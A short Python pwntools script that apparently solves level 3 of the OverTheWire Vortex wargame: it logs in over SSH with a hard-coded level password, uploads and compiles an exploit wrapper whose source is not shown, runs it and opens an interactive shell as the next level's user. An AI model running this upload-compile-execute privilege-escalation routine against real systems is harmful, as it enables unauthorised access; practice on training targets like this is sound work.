#!/usr/bin/python3
from pwn import *
import os
import time

#Level information for ssh
level = 3
USER = 'vortex%s' % level
HOST = 'vortex.labs.overthewire.org'
PASS = 'g3crKgtu7'
PORT = 2228

def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
    return sh

def setup_payload(sh):
    shell = sh.run('/bin/bash')
    w = log.progress("Creating /tmp/tald3")
    shell.sendline(b'mkdir /tmp/tald3')
    shell.sendline(b'cd /tmp/tald3')
    sh.set_working_directory(b'/tmp/tald3')
    w.success("Created")
    time.sleep(0.05)
    sh.upload_file("./serverwrapper.c")
    time.sleep(0.05)
    w = log.progress("Compiling vortex 3 wrapper...")
    shell.sendline("gcc -m32 /tmp/tald3/serverwrapper.c -o /tmp/tald3/pwn")
    w.success("compiled")

def execute_payload(sh):
    time.sleep(0.05)
    w = log.progress("Executing vortex 3 wrapper...")
    shell = sh.run(b'/tmp/tald3/pwn ')
    w.success("vortex4 shell established")
    shell.interactive()

sh = connect_to_level()
setup_payload(sh)
execute_payload(sh)
